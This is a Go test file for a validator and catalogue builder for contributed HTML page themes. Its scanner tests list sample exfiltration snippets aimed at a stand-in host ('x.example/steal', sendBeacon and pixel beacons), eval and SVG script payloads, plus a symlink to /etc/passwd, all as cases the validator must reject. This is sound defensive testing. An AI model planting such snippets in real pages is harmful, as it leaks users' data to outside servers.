package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"image"
	"image/png"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const goodManifest = `{
  "name": "demo",
  "version": "1.0.0",
  "title": {"en": "Demo", "fa": "نمونه", "ru": "Демо", "zh": "示例"},
  "description": {"en": "A page.", "fa": "یک صفحه.", "ru": "Страница.", "zh": "一个页面。"},
  "author": {"name": "Someone", "github": "someone"},
  "panelMin": "0.1.0"
}`

func TestManifest(t *testing.T) {
	tests := []struct {
		name    string
		edit    func(string) string
		dir     string
		wantErr string // from parsing
		want    string // one of the problems
	}{
		{name: "good", edit: func(s string) string { return s }, dir: "demo"},
		{name: "name differs from the directory", edit: func(s string) string { return s }, dir: "other", want: `name is "demo"`},
		{name: "version", edit: func(s string) string { return strings.Replace(s, `"1.0.0"`, `"1.0"`, 1) }, dir: "demo", want: "not MAJOR.MINOR.PATCH"},
		{name: "leading zero", edit: func(s string) string { return strings.Replace(s, `"1.0.0"`, `"01.0.0"`, 1) }, dir: "demo", want: "not MAJOR.MINOR.PATCH"},
		{name: "panelMin", edit: func(s string) string { return strings.Replace(s, `"0.1.0"`, `"v0.1.0"`, 1) }, dir: "demo", want: "panelMin"},
		{name: "a missing locale", edit: func(s string) string { return strings.Replace(s, `, "zh": "示例"`, "", 1) }, dir: "demo", want: `title has no "zh" text`},
		{name: "a locale the page has not", edit: func(s string) string { return strings.Replace(s, `"zh": "示例"`, `"zh": "示例", "de": "Demo"`, 1) }, dir: "demo", want: `"de", which is not a page language`},
		{name: "blank text", edit: func(s string) string { return strings.Replace(s, `"Demo"`, `"  "`, 1) }, dir: "demo", want: "title.en is blank"},
		{name: "long title", edit: func(s string) string { return strings.Replace(s, `"Demo"`, `"`+strings.Repeat("x", 61)+`"`, 1) }, dir: "demo", want: "longer than 60"},
		{name: "github login", edit: func(s string) string { return strings.Replace(s, `"someone"`, `"some one"`, 1) }, dir: "demo", want: "not a GitHub account name"},
		{name: "no author name", edit: func(s string) string { return strings.Replace(s, `"Someone"`, `""`, 1) }, dir: "demo", want: "author.name"},
		{name: "unknown field", edit: func(s string) string { return strings.Replace(s, `"name"`, `"nmae": "x", "name"`, 1) }, dir: "demo", wantErr: "unknown field"},
		{name: "two values", edit: func(s string) string { return s + "{}" }, dir: "demo", wantErr: "more than one JSON value"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			m, err := parseManifest([]byte(tt.edit(goodManifest)))
			if tt.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("err = %v, want %q", err, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			got := strings.Join(m.problems(tt.dir), "\n")
			if tt.want == "" && got != "" {
				t.Fatalf("problems:\n%s", got)
			}
			if tt.want != "" && !strings.Contains(got, tt.want) {
				t.Fatalf("problems:\n%s\nwant one containing %q", got, tt.want)
			}
		})
	}
}

func TestNewer(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"1.0.1", "1.0.0", true},
		{"1.10.0", "1.9.9", true},
		{"2.0.0", "1.99.99", true},
		{"1.0.0", "1.0.0", false},
		{"1.0.0", "1.0.1", false},
	}
	for _, tt := range tests {
		if got := newer(tt.a, tt.b); got != tt.want {
			t.Errorf("newer(%s, %s) = %v", tt.a, tt.b, got)
		}
	}
}

func TestScan(t *testing.T) {
	tests := []struct {
		ext, text string
		bad       bool
	}{
		// Markup.
		{".html", `<script src="https://cdn.example/a.js"></script>`, true},
		{".html", `<script src="{{ .AssetBase }}/a.js"></script>`, false},
		{".html", `<link rel=stylesheet href=//cdn.example/a.css>`, true},
		{".html", `<link rel="stylesheet" href="{{ .AssetBase }}/style.css">`, false},
		{".html", `<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>`, true},
		{".html", `<img src="data:image/png;base64,AAAA">`, false},
		{".html", `<img srcset="a.png 1x, https://x.example/b.png 2x">`, true},
		{".html", `<IMG SRC='HTTP://x.example/a.png'>`, true},
		{".html", `<a href="https://play.google.com/store/apps/details?id=x">get</a>`, false},
		{".html", `<a href="v2rayng://install-sub?url={{ urlquery .Sub.URL }}">add</a>`, false},
		{".html", `<form action="https://x.example/steal"><input></form>`, true},
		{".html", `<button formaction="https://x.example/">go</button>`, true},
		{".html", `<iframe src="https://x.example/"></iframe>`, true},
		{".html", `<object data="https://x.example/a.swf"></object>`, true},
		{".html", `<base href="https://x.example/">`, true},
		{".html", `<meta http-equiv="refresh" content="0;url=https://x.example/">`, true},
		{".html", `<meta name="viewport" content="width=device-width, initial-scale=1">`, false},
		{".html", `<svg><circle stroke="url(#ring)"></circle></svg>`, false},
		{".html", `<svg><image href="https://x.example/a.png"/></svg>`, true},
		// Stylesheets.
		{".css", `@import url("https://fonts.example/a.css");`, true},
		{".css", `@import "//fonts.example/a.css";`, true},
		{".css", `@import "local.css";`, false},
		{".css", `body { background: url(https://x.example/a.png) }`, true},
		{".css", `body { background: url('img/a.png') }`, false},
		{".html", `<div style="background:url('https://x.example/a.png')"></div>`, true},
		// Scripts.
		{".js", `fetch("https://x.example/collect", {method: "POST"})`, true},
		{".js", `fetch(INFO, {cache: "no-store"})`, false},
		{".html", `<script>fetch({{ .Sub.URL }} + "/info")</script>`, false},
		{".js", `var x = new XMLHttpRequest(); x.open("POST", "https://x.example/");`, true},
		{".js", `x.open('GET', '/info')`, false},
		{".js", `window.open("https://apps.apple.com/app/x", "_blank")`, false},
		{".js", "new WebSocket(`wss://x.example/`)", true},
		{".js", `new EventSource("https://x.example/")`, true},
		{".js", `navigator.sendBeacon("https://x.example/", data)`, true},
		{".js", `new Image().src = "https://x.example/p.gif?" + data`, true},
		{".js", `el.setAttribute("src", "https://x.example/a.js")`, true},
		{".js", `location.href = "https://x.example/"`, false},
		{".js", `eval(code)`, true},
		{".js", `var f = new Function("return 1")`, true},
		{".js", `document.write("<p>")`, true},
		{".js", `setTimeout("go()", 10)`, true},
		{".js", `setTimeout(function () { go() }, 10)`, false},
		{".js", `import("https://x.example/m.js")`, true},
		{".js", `document.execCommand("copy")`, false},
		// Images.
		{".svg", `<svg><script>alert(1)</script></svg>`, true},
		{".svg", `<svg onload="alert(1)"></svg>`, true},
		{".svg", `<svg><foreignObject></foreignObject></svg>`, true},
		{".svg", `<svg><use href="https://x.example/s.svg#a"/></svg>`, true},
		{".svg", `<svg viewBox="0 0 10 10"><path d="M0 0h10"/></svg>`, false},
	}
	for _, tt := range tests {
		got := scan(tt.ext, []byte(tt.text))
		if bad := len(got) > 0; bad != tt.bad {
			t.Errorf("%s %s: problems %q, want bad=%v", tt.ext, tt.text, got, tt.bad)
		}
	}
}

func writeFile(t *testing.T, path string, data []byte) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
}

func pngOf(t *testing.T, w, h int) []byte {
	t.Helper()
	var b bytes.Buffer
	if err := png.Encode(&b, image.NewGray(image.Rect(0, 0, w, h))); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// theme writes a theme that passes every rule into root/name.
func theme(t *testing.T, root, name string) string {
	t.Helper()
	dir := filepath.Join(root, name)
	writeFile(t, filepath.Join(dir, "index.html"), []byte(`<!doctype html><title>x</title><link rel="stylesheet" href="{{ .AssetBase }}/style.css"><p>{{ num .Usage.UsedText }}</p>`))
	writeFile(t, filepath.Join(dir, "style.css"), []byte(`body { margin: 0 }`))
	writeFile(t, filepath.Join(dir, "README.md"), []byte("# x\n"))
	writeFile(t, filepath.Join(dir, "preview.png"), pngOf(t, 390, 844))
	writeFile(t, filepath.Join(dir, "theme.json"), []byte(strings.Replace(goodManifest, `"demo"`, `"`+name+`"`, 1)))
	return dir
}

func TestCheckFiles(t *testing.T) {
	tests := []struct {
		name  string
		setup func(t *testing.T, dir string)
		want  string
	}{
		{name: "clean", setup: func(*testing.T, string) {}},
		{name: "hidden file", setup: func(t *testing.T, dir string) { writeFile(t, filepath.Join(dir, ".env"), nil) }, want: "hidden"},
		{name: "hidden directory", setup: func(t *testing.T, dir string) { writeFile(t, filepath.Join(dir, ".git", "x"), nil) }, want: "hidden"},
		{name: "link", setup: func(t *testing.T, dir string) {
			if err := os.Symlink("/etc/passwd", filepath.Join(dir, "p.css")); err != nil {
				t.Skip(err)
			}
		}, want: "links are not allowed"},
		{name: "kind", setup: func(t *testing.T, dir string) { writeFile(t, filepath.Join(dir, "run.sh"), nil) }, want: "may hold only"},
		{name: "renamed binary", setup: func(t *testing.T, dir string) { writeFile(t, filepath.Join(dir, "img", "a.png"), []byte("GIF89a")) }, want: "not a png file"},
		{name: "too big", setup: func(t *testing.T, dir string) {
			writeFile(t, filepath.Join(dir, "big.css"), bytes.Repeat([]byte(" "), maxThemeBytes))
		}, want: "KB in all"},
		{name: "too many files", setup: func(t *testing.T, dir string) {
			for i := range maxThemeFiles {
				writeFile(t, filepath.Join(dir, "f", strings.Repeat("a", i%5+1)+string(rune('a'+i%26))+strings.Repeat("b", i/26)+".css"), nil)
			}
		}, want: "files; a theme holds at most"},
		{name: "no README", setup: func(t *testing.T, dir string) { os.Remove(filepath.Join(dir, "README.md")) }, want: "no README.md"},
		{name: "no preview", setup: func(t *testing.T, dir string) { os.Remove(filepath.Join(dir, "preview.png")) }, want: "no preview.png"},
		{name: "preview tiny", setup: func(t *testing.T, dir string) { writeFile(t, filepath.Join(dir, "preview.png"), pngOf(t, 100, 100)) }, want: "keep it 300 to 1600"},
		{name: "preview not png", setup: func(t *testing.T, dir string) {
			writeFile(t, filepath.Join(dir, "preview.png"), []byte("\x89PNG\r\n\x1a\nxx"))
		}, want: "not a PNG image"},
		{name: "remote load in a nested file", setup: func(t *testing.T, dir string) {
			writeFile(t, filepath.Join(dir, "js", "a.js"), []byte(`fetch("https://x.example/")`))
		}, want: "js/a.js: a script sends a request"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := theme(t, t.TempDir(), "demo")
			tt.setup(t, dir)
			got := strings.Join(checkFiles(dir, true), "\n")
			if tt.want == "" && got != "" {
				t.Fatalf("problems:\n%s", got)
			}
			if tt.want != "" && !strings.Contains(got, tt.want) {
				t.Fatalf("problems:\n%s\nwant one containing %q", got, tt.want)
			}
		})
	}
}

func TestStarterNeedsNoPreview(t *testing.T) {
	root := t.TempDir()
	dir := theme(t, root, starter)
	os.Remove(filepath.Join(dir, "preview.png"))
	if r := run(options{root: root}); r.failed {
		t.Fatalf("starter without a preview failed:\n%s", strings.Join(r.lines, "\n"))
	}
}

func TestRun(t *testing.T) {
	root := t.TempDir()
	theme(t, root, "good")
	bad := theme(t, root, "bad")
	writeFile(t, filepath.Join(bad, "index.html"), []byte(`{{ .X `))
	writeFile(t, filepath.Join(root, "builtin", "violet", "index.html"), []byte(`<link href="https://fonts.example/a.css">{{ .Y }}`))
	writeFile(t, filepath.Join(root, "notatheme", "notes.md"), nil)

	r := run(options{root: root})
	got := strings.Join(r.lines, "\n")
	for _, want := range []string{"ok  good", "bad: ", "ok  builtin/violet (parsed only)"} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q in:\n%s", want, got)
		}
	}
	if strings.Contains(got, "notatheme") {
		t.Errorf("a directory with no page was checked:\n%s", got)
	}
	if !r.failed {
		t.Error("a theme that does not parse passed")
	}
}

func TestRunEmpty(t *testing.T) {
	if r := run(options{root: t.TempDir()}); !r.failed {
		t.Fatal("no themes passed")
	}
}

func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.org", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.org")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestCompareWithBase(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	setup := func(t *testing.T) string {
		root := t.TempDir()
		theme(t, root, "demo")
		theme(t, root, "other")
		gitIn(t, root, "init", "-q", "-b", "main")
		gitIn(t, root, "add", ".")
		gitIn(t, root, "commit", "-qm", "base")
		gitIn(t, root, "tag", "base")
		return root
	}
	commit := func(t *testing.T, root string) {
		gitIn(t, root, "add", "-A")
		gitIn(t, root, "commit", "-qm", "change")
	}
	edit := func(t *testing.T, root string) {
		writeFile(t, filepath.Join(root, "demo", "style.css"), []byte(`body { margin: 1px }`))
	}
	bump := func(t *testing.T, root string) {
		writeFile(t, filepath.Join(root, "demo", "theme.json"), []byte(strings.Replace(goodManifest, `"1.0.0"`, `"1.0.1"`, 1)))
	}

	t.Run("a change without a bump fails", func(t *testing.T) {
		root := setup(t)
		edit(t, root)
		commit(t, root)
		r := run(options{root: root, base: "base", author: "someone"})
		if !r.failed || !strings.Contains(strings.Join(r.lines, "\n"), "demo: its files changed, so its version must rise above 1.0.0") {
			t.Fatalf("lines:\n%s", strings.Join(r.lines, "\n"))
		}
	})
	t.Run("a change with a bump passes", func(t *testing.T) {
		root := setup(t)
		edit(t, root)
		bump(t, root)
		commit(t, root)
		r := run(options{root: root, base: "base", author: "SomeOne"})
		if r.failed || len(r.warnings) > 0 {
			t.Fatalf("lines:\n%s\nwarnings: %q", strings.Join(r.lines, "\n"), r.warnings)
		}
	})
	t.Run("someone else's theme warns", func(t *testing.T) {
		root := setup(t)
		edit(t, root)
		bump(t, root)
		commit(t, root)
		r := run(options{root: root, base: "base", author: "intruder"})
		if r.failed || len(r.warnings) != 1 || !strings.Contains(r.warnings[0], "demo is by someone, and this pull request is by intruder") {
			t.Fatalf("lines:\n%s\nwarnings: %q", strings.Join(r.lines, "\n"), r.warnings)
		}
	})
	t.Run("a new theme needs no bump", func(t *testing.T) {
		root := setup(t)
		theme(t, root, "fresh")
		commit(t, root)
		if r := run(options{root: root, base: "base", author: "newcomer"}); r.failed || len(r.warnings) > 0 {
			t.Fatalf("lines:\n%s\nwarnings: %q", strings.Join(r.lines, "\n"), r.warnings)
		}
	})
	t.Run("an unknown base fails", func(t *testing.T) {
		root := setup(t)
		if r := run(options{root: root, base: "nope"}); !r.failed {
			t.Fatal("passed")
		}
	})
}

// readTarGz unpacks an archive into its entries, in order.
func readTarGz(t *testing.T, raw []byte) (names []string, files map[string][]byte) {
	t.Helper()
	zr, err := gzip.NewReader(bytes.NewReader(raw))
	if err != nil {
		t.Fatal(err)
	}
	tr := tar.NewReader(zr)
	files = map[string][]byte{}
	for {
		h, err := tr.Next()
		if err == io.EOF {
			return names, files
		}
		if err != nil {
			t.Fatal(err)
		}
		names = append(names, h.Name)
		if h.Typeflag == tar.TypeReg {
			b, _ := io.ReadAll(tr)
			files[h.Name] = b
		}
	}
}

func TestBuildCatalog(t *testing.T) {
	root := t.TempDir()
	theme(t, root, "midnight")
	paper := theme(t, root, "paper")
	writeFile(t, filepath.Join(paper, "img", "icons", "a.svg"), []byte(`<svg viewBox="0 0 1 1"></svg>`))
	theme(t, root, starter)
	writeFile(t, filepath.Join(root, "builtin", "violet", "index.html"), []byte(`x`))
	if r := run(options{root: root}); r.failed {
		t.Fatalf("fixture fails check:\n%s", strings.Join(r.lines, "\n"))
	}

	out := filepath.Join(t.TempDir(), "dist")
	when := time.Unix(1793560000, 0)
	idx, err := buildCatalog(root, out, "catalog-x", "abc", when)
	if err != nil {
		t.Fatal(err)
	}

	raw, err := os.ReadFile(filepath.Join(out, catalogArchive))
	if err != nil {
		t.Fatal(err)
	}
	names, files := readTarGz(t, raw)
	if got, want := strings.Join(names, " "), "catalog.json previews/ previews/midnight.png previews/paper.png"; got != want {
		t.Fatalf("catalogue entries %q, want %q", got, want)
	}
	var read catalogIndexFile
	if err := json.Unmarshal(files[catalogIndex], &read); err != nil {
		t.Fatal(err)
	}
	if read.Format != 1 || read.Build != "catalog-x" || read.Commit != "abc" || read.GeneratedAt != when.Unix() || len(read.Themes) != 2 {
		t.Fatalf("index %+v", read)
	}
	m := read.Themes[1]
	if m.Name != "paper" || m.Version != "1.0.0" || m.Title["fa"] != "نمونه" || m.Author.GitHub != "someone" || m.PanelMin != "0.1.0" ||
		m.Preview != "previews/paper.png" || m.Archive != "paper-1.0.0.tar.gz" || m.Files != 6 {
		t.Fatalf("paper %+v", m)
	}
	if !bytes.Equal(files["previews/paper.png"], pngOf(t, 390, 844)) {
		t.Error("the preview is not the theme's")
	}

	archive, err := os.ReadFile(filepath.Join(out, m.Archive))
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(archive)
	if hex.EncodeToString(sum[:]) != m.SHA256 || int64(len(archive)) != m.Size {
		t.Fatal("the index's checksum or size is not the archive's")
	}
	names, files = readTarGz(t, archive)
	if got, want := strings.Join(names, " "), "README.md img/ img/icons/ img/icons/a.svg index.html preview.png style.css theme.json"; got != want {
		t.Fatalf("theme entries %q, want %q", got, want)
	}
	if string(files["style.css"]) != "body { margin: 0 }" {
		t.Errorf("style.css = %q", files["style.css"])
	}
	if _, err := os.Stat(filepath.Join(out, "starter-1.0.0.tar.gz")); err == nil {
		t.Error("starter was published")
	}

	// The same files make the same archive, later and elsewhere.
	again := filepath.Join(t.TempDir(), "dist")
	idx2, err := buildCatalog(root, again, "catalog-y", "def", when.Add(time.Hour))
	if err != nil {
		t.Fatal(err)
	}
	if idx2.Themes[1].SHA256 != idx.Themes[1].SHA256 {
		t.Error("an unchanged theme's archive changed between builds")
	}
}

func TestBuildCatalogEmpty(t *testing.T) {
	root := t.TempDir()
	theme(t, root, starter)
	out := t.TempDir()
	idx, err := buildCatalog(root, out, "b", "c", time.Unix(1, 0))
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(filepath.Join(out, catalogArchive))
	_, files := readTarGz(t, raw)
	if len(idx.Themes) != 0 || !strings.Contains(string(files[catalogIndex]), `"themes": []`) {
		t.Fatalf("index %s", files[catalogIndex])
	}
}
